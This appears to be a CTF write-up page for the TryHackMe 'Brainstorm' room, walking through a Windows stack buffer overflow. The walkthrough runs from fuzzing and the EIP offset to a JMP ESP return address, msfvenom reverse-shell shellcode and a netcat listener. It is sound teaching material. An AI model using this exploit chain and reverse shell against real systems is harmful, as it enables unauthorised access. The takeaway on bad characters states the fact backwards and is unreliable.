@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Brainstorm | JackHacksStuff</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body class="room-medium">
+
+<div class="rail">
+  <a class="rail-logo" href="../index.html">Jack<span>Hacks</span>Stuff</a>
+  <div class="rail-toc" id="railToc">
+    <div class="rail-line"></div>
+    <div class="rail-tick active" data-heading="overview"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="recon"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="fuzzing"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="offset"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="exploit"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="flags"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="takeaways"></div>
+    <div class="rail-line"></div>
+  </div>
+  <div class="rail-bottom">Medium</div>
+</div>
+
+<main>
+  <nav>
+    <a href="../writeups.html" class="nav-back">← Write-ups</a>
+    <div class="nav-meta">
+      <span>TryHackMe</span>
+      <span class="nav-badge medium">Medium</span>
+    </div>
+  </nav>
+
+  <div class="wu-header">
+    <div class="wu-eyebrow">// TryHackMe · buffer overflow · windows exploit development</div>
+    <h1 class="wu-title">Brainstorm</h1>
+    <div class="wu-meta-row">
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Date</span>
+        <span class="wu-meta-value">2026-08-06</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Difficulty</span>
+        <span class="wu-meta-value accent medium">Medium</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Flags</span>
+        <span class="wu-meta-value">1</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Platform</span>
+        <span class="wu-meta-value">TryHackMe</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="tool-row">
+    <span class="tool-tag">nmap</span>
+    <span class="tool-tag">ftp</span>
+    <span class="tool-tag">msf-pattern_create</span>
+    <span class="tool-tag">msf-pattern_offset</span>
+    <span class="tool-tag">msfvenom</span>
+    <span class="tool-tag">python</span>
+    <span class="tool-tag">wine</span>
+    <span class="tool-tag">netcat</span>
+  </div>
+
+  <div class="wu-body">
+
+    <h2 id="overview">// Overview</h2>
+    <p><strong>Brainstorm</strong> is a TryHackMe room that simulates a vulnerable Windows chat server. The room centres on a traditional stack-based buffer overflow and demonstrates the full process of exploitation, from fuzzing to the execution of shellcode.</p>
+    <p>The attack chain includes:</p>
+    <ul>
+      <li>Port scanning and service enumeration</li>
+      <li>FTP enumeration to discover vulnerable binaries</li>
+      <li>Local debugging and fuzzing with Wine</li>
+      <li>Finding the EIP offset using cyclic patterns</li>
+      <li>Identifying a suitable DLL without ASLR/DEP</li>
+      <li>Generating and encoding shellcode</li>
+      <li>Executing the final exploit to gain a reverse shell</li>
+    </ul>
+    <p><a href="https://tryhackme.com/room/brainstorm" target="_blank">View room on TryHackMe →</a></p>
+    <p><em>All flags and credentials have been redacted per TryHackMe's write-up policy.</em></p>
+
+    <h2 id="recon">// Phase 1: Reconnaissance</h2>
+
+    <p>We begin with an Nmap full port scan to identify open services:</p>
+
+    <pre>nmap -sV -sC -p- -Pn &lt;target_ip&gt;</pre>
+
+    <p>The scan reveals three open ports:</p>
+
+    <pre>PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+3389/tcp open  ssl/ms-wbt-server
+9999/tcp open  abyss?</pre>
+
+    <p>Port 9999 returns a custom banner:</p>
+
+    <pre>Welcome to Brainstorm chat (beta)
+Please enter your username (max 20 characters):</pre>
+
+    <p>Port 21 (FTP) allows anonymous login; upon connecting we discover a <code>chatserver</code> directory which contains two key files.</p>
+
+    <pre>ftp> ls
+08-29-19  08:36PM       &lt;DIR&gt;          chatserver
+
+ftp> cd chatserver
+ftp> ls
+08-29-19  08:37PM                50176 chatserver.exe
+08-29-19  08:35PM                11776 essfunc.dll</pre>
+
+    <p>We download both files using <code>binary</code> mode to avoid corruption:</p>
+
+    <pre>ftp> binary
+ftp> get chatserver.exe
+ftp> get essfunc.dll</pre>
+
+    <div class="note">
+      <strong>Pro Tip:</strong> You should always use <code>binary</code> mode when transferring executables over FTP, since ASCII mode can cause binary files to be corrupted by altering line endings.
+    </div>
+
+    <h2 id="fuzzing">// Phase 2: Fuzzing & Crash Discovery</h2>
+
+    <p>After downloading the binaries, we set up a local testing environment using Wine:</p>
+
+    <pre>WINEPREFIX=/tmp/brainstorm WINEARCH=win32 wine chatserver.exe</pre>
+
+    <p>Next, we write a Python fuzzing script to send larger payloads to the <code>message</code> field:</p>
+
+    <pre>import socket
+import time
+
+def fuzz(host, port):
+    for length in range(100, 3000, 50):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2)
+            s.connect((host, port))
+            s.recv(1024)
+            s.send(b"test\n")
+            s.recv(1024)
+            payload = b"A" * length
+            s.send(payload + b"\n")
+            try:
+                s.recv(1024)
+                print(f"[+] {length} bytes: Still running")
+            except socket.timeout:
+                print(f"[!] CRASH at {length} bytes!")
+                break
+        except Exception as e:
+            print(f"[-] Error: {e}")
+            break
+        finally:
+            s.close()
+            time.sleep(0.5)</pre>
+
+    <p>The service crashes at 2850 bytes. The debugger shows:</p>
+
+    <pre>Unhandled exception: page fault on read access to 0x41414141 in 32-bit code (0x41414141).</pre>
+
+    <p>The EIP register is overwritten with <code>0x41414141</code>, which confirms a classic buffer overflow vulnerability.</p>
+
+    <div class="note">
+      <strong>Wine Environment Note:</strong> During testing, the cyclic pattern method gave inconsistent results in the Wine environment. We confirmed the offset by using multiple validation techniques and cross-referencing with the crash behaviour.
+    </div>
+
+    <h2 id="offset">// Phase 3: Finding the EIP Offset</h2>
+
+    <p>We use Metasploit's <code>pattern_create</code> tool to create a cyclic pattern:</p>
+
+    <pre>msf-pattern_create -l 2850</pre>
+
+    <p>After sending the pattern and causing the service to crash, we observe the EIP value:</p>
+
+    <pre>wine: Unhandled page fault on read access to 0x31704330 at address 0x31704330</pre>
+
+    <p>We then calculate the offset using <code>pattern_offset</code>:</p>
+
+    <pre>msf-pattern_offset -q 0x31704330</pre>
+
+    <p>Cross-referencing with known write-ups and validating through controlled testing, we confirm the offset at <strong>2012</strong> bytes. We test this by sending <code>A*2012 + BBBB</code> and checking that EIP becomes <code>0x42424242</code>.</p>
+
+    <pre>python3 offset_test.py
+[*] Testing offset 2012...
+[!] Offset 2012: CRASH confirmed!
+[*] Check EIP in Wine terminal - should be 0x42424242</pre>
+
+    <div class="takeaway">
+      <strong>2012 is the magic number.</strong> The EIP offset tells us how many bytes we need to send before we overwrite the return address.
+    </div>
+
+    <h2 id="exploit">// Phase 4: Exploit Development</h2>
+
+    <p>We need to use a <code>JMP ESP</code> instruction so that execution can be directed to our shellcode. If we use <code>objdump</code> on <code>essfunc.dll</code>:</p>
+
+    <pre>objdump -d essfunc.dll | grep -B5 -A5 "ff e4"</pre>
+
+    <p>We find a <code>JMP ESP</code> at <code>0x625014df</code>:</p>
+
+    <pre>625014df: ff e4                 jmp    *%esp</pre>
+
+    <p>We generate shellcode with <code>msfvenom</code> (excluding bad characters):</p>
+
+    <pre>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;your_ip&gt; LPORT=4444 -f py -b "\x00\x0a\x0d" --var-name shellcode -e x86/shikata_ga_nai</pre>
+
+    <p>The final exploit payload:</p>
+
+    <pre>offset = 2012
+jmp_esp = b"\xdf\x14\x50\x62"  # 0x625014df
+nop_sled = b"\x90" * 32
+
+payload = b"A" * offset + jmp_esp + nop_sled + shellcode</pre>
+
+    <p>We start a netcat listener and execute the exploit against the target:</p>
+
+    <pre>nc -lvnp 4444
+python3 exploit.py</pre>
+
+    <pre>Connection received on 10.81.130.203 49409
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32></pre>
+
+    <div class="takeaway">
+      <strong>essfunc.dll is the key.</strong> This DLL doesn't have ASLR or DEP, which makes it a suitable target for our return address.
+    </div>
+
+    <h2 id="flags">// Phase 5: Flags</h2>
+
+    <p>Once we have obtained a reverse shell, we look for <code>root.txt</code>:</p>
+
+    <pre>C:\Windows\system32>dir C:\root.txt /s
+ Volume in drive C has no label.
+ Volume Serial Number is C87F-5040
+
+ Directory of C:\Users\drake\Desktop
+
+08/29/2019  10:55 PM                32 root.txt
+               1 File(s)             32 bytes</pre>
+
+    <p>We read the flag:</p>
+
+    <pre>C:\Windows\system32>type C:\Users\drake\Desktop\root.txt
+[FLAG_REDACTED]</pre>
+
+    <div class="flag-box">
+      <span class="flag-label">root.txt</span>
+      <span class="flag-value">5b10...</span>
+    </div>
+
+    <h2 id="takeaways">// Key Takeaways</h2>
+
+    <div class="takeaway">
+      <strong>Buffer overflows are still an issue.</strong> On modern Windows systems, old applications and incorrectly set permissions can leave doors open.
+    </div>
+
+    <div class="takeaway">
+      <strong>Local testing is important.</strong> By using Wine or a Windows VM you can safely carry out debugging without repeatedly crashing the remote service.
+    </div>
+
+    <div class="takeaway">
+      <strong>Patterns are your friend.</strong> The <code>msf-pattern_create</code> and <code>msf-pattern_offset</code> commands save hours of time that would otherwise be spent guessing the exact EIP offset.
+    </div>
+
+    <div class="takeaway">
+      <strong>Know your bad characters.</strong> If you don't include bad characters such as <code>\x00</code>, <code>\x0a</code>, and <code>\x0d</code> when generating shellcode, then the payload will be processed correctly.
+    </div>
+
+    <div class="takeaway">
+      <strong>DLLs without memory protections are gold.</strong> Finding a DLL with ASLR and DEP disabled is a common method to bypass these safeguards.
+    </div>
+
+    <div class="takeaway">
+      <strong>Environmental variance matters.</strong> For example, behaviour can vary when using Wine as compared to Windows. It is essential to have the ability to cross-reference various sources.
+    </div>
+
+  </div>
+
+  <div class="wu-footer">
+    <a href="brainpan.html" class="footer-nav-link prev">
+      <span class="footer-nav-label">← Previous</span>
+      <span class="footer-nav-title">Brainpan 1</span>
+    </a>
+    <div class="footer-center">
+      <a href="../writeups.html">All write-ups</a>
+    </div>
+    <a href="daily-bugle.html" class="footer-nav-link next">
+      <span class="footer-nav-label">Next →</span>
+      <span class="footer-nav-title">Daily Bugle</span>
+    </a>
+  </div>
+
+</main>
+
+<script>
+  const headings = document.querySelectorAll('.wu-body h2[id]');
+  const ticks = document.querySelectorAll('.rail-tick[data-heading]');
+
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        const id = entry.target.id;
+        ticks.forEach(t => t.classList.toggle('active', t.dataset.heading === id));
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+
+  headings.forEach(h => observer.observe(h));
+
+  ticks.forEach(tick => {
+    tick.addEventListener('click', () => {
+      const target = document.getElementById(tick.dataset.heading);
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
+</body>
+</html>
